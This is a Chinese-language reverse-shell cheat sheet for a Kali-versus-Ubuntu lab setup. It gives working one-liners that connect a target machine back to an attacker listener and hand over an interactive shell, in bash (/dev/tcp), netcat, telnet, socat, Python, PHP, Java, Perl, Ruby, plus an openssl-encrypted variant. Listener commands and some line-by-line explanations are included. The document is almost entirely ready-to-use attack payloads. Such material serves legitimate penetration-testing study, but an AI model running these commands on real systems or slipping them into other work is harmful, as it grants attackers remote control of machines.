靶机：Ubuntu 192.168.229.131

攻击机：Kali 192.168.229.129

## Bash反弹

攻击机：

```
nc -lvp 4444
```

靶机：

```
bash -i >& /dev/tcp/192.168.229.129/4444 0>&1
```

`bash -i`：代表在本地打开一个bash并允许用户与 shell 进行交互输入输出。

`/dev/tcp/ip/port`：建立一个socket连接。

`>&`：在这是将标准输出和标准错误输出重定向到后面指定的位置。

`0>&1`：代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了`/dev/tcp/ip/port`这个连接，所以可以直接在远程输入命令

PS：

```
当>&后面接文件时，表示将标准输出和标准错误输出重定向至文件。
当>&后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符

0 - stdin 代表标准输入,使用<或<<
1 - stdout 代表标准输出,使用>或>>
2 - stderr 代表标准错误输出,使用2>或2>>
```

## nc反弹

```
nc -e /bin/bash 192.168.229.129 4444
```

## Telnet反弹

攻击机：需要监听两个端口

```
nc -vlp 4444
nc -vlp 5555
```

靶机：

```
telnet 192.168.229.129 4444 | /bin/bash | telnet 192.168.229.129 5555
```

## socat反弹

```
socat tcp-connect:192.168.229.129:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

- `socat`: 这是一个 Linux 下强大的网络工具，用于建立连接并在不同数据流之间传输数据。
- `tcp-connect:192.168.229.129:4444`: 指定连接的类型为 TCP 连接，连接到 IP 地址为 `192.168.229.129` 的远程主机的端口 `4444`。
- `exec:'bash -li'`: 当连接建立后，在远程主机上执行 `bash -li` 命令，这会启动一个交互式的 Bash shell，并将其与已建立的连接关联。
- `pty`: 将连接转换为伪终端（pty），这使得能够在交互式 shell 中输入和输出。
- `stderr`: 将标准错误（stderr）与伪终端关联，以便在出现错误时也能够捕获并显示。
- `setsid`: 在新的进程组中启动 shell，避免终端信号（如 SIGHUP）的影响。
- `sigint`: 转发中断信号，允许通过按下 Ctrl + C 中断正在执行的命令。
- `sane`: 确保传输的数据流在连接关闭后进行清理和关闭。

## Python反弹

```python
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.229.129',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

解释：

```python
import os
import socket
import subprocess

# 创建一个 TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接到指定的远程主机和端口（192.168.229.129:4444）
s.connect(('192.168.229.129', 4444))

# 重定向标准输入、输出和错误到建立的 socket 连接
os.dup2(s.fileno(), 0)  # 标准输入
os.dup2(s.fileno(), 1)  # 标准输出
os.dup2(s.fileno(), 2)  # 标准错误

# 调用一个新的进程，在该进程中执行交互式的 Bash shell
subprocess.call(['/bin/bash', '-i'])
```

## Php反弹

```php
php -r '$sock=fsockopen("192.168.229.129",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Java反弹

```java
public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/xx.xx.xx.xx/xxxx;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

## perl反弹

```perl
perl -e 'use Socket;$i="192.168.229.129";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## ruby反弹

```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.229.129","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
或者：
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.229.129","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Openssh反弹加密shell

攻击机：

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

靶机：

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.229.129:4444 > /tmp/s; rm /tmp/s
```

